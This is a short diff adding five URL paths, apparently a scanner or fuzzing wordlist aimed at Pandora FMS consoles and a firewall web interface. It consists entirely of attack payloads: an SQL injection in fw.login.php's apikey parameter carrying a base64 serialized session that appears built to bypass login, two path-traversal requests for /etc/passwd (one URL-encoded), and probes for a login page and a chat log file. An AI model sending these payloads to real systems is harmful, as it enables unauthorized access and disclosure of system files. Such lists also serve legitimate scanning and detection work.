@@ -1,0 +1,5 @@
+/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;
+/pandora_console/ajax.php?page=../../../../../../etc/passwd
+/fw.progrss.details.php?popup=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+/fw.login.php
+/pandora_console/attachment/pandora_chat.log.json.txt
